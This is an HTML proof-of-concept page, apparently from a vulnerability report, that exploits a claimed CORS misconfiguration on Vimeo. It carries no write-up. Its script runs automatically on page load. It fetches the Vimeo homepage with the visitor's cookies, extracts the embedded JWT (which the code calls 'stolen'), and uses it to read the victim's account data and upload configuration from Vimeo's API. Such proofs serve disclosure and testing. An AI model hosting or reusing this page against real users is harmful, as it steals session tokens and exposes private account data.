<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Vimeo CORS Misconfiguration PoC</title>
</head>
<body>
  <h1>Vimeo CORS Misconfiguration PoC</h1>
  <pre id="output">Loading...</pre>

  <script>
    async function runPoC() {
      const output = document.getElementById("output");

      try {
        // Step 1: Fetch Vimeo homepage with cookies
        output.textContent = "[*] Fetching Vimeo homepage…";
        const homepage = await fetch("https://vimeo.com/", { credentials: "include" });
        const html = await homepage.text();

        // Step 2: Extract JWT embedded in the page
        const jwtMatch = html.match(/"jwt"\s*:\s*"([^"]+)"/);
        if (!jwtMatch) {
          output.textContent = "[!] Could not find JWT in homepage source";
          return;
        }
        const jwt = jwtMatch[1];
        output.textContent = "[+] Extracted JWT:\n" + jwt + "\n\n";

        // Step 3: Call /users/me with the stolen JWT
        output.textContent += "[*] Fetching /users/me with JWT…\n";
        const meResp = await fetch("https://api.vimeo.com/users/me", {
          headers: { "Authorization": "jwt " + jwt }
        });
        const meData = await meResp.json();

        output.textContent += "[+] Account data:\n" + JSON.stringify(meData, null, 2) + "\n\n";

        // Step 4: (Optional) call /upload/config for completeness
        output.textContent += "[*] Fetching /upload/config with JWT…\n";
        const configResp = await fetch("https://api.vimeo.com/upload/config", {
          headers: { "Authorization": "jwt " + jwt }
        });
        const configData = await configResp.json();

        output.textContent += "[+] Upload config:\n" + JSON.stringify(configData, null, 2);

      } catch (err) {
        output.textContent = "[!] Error: " + err;
      }
    }

    runPoC();
  </script>
</body>
</html>
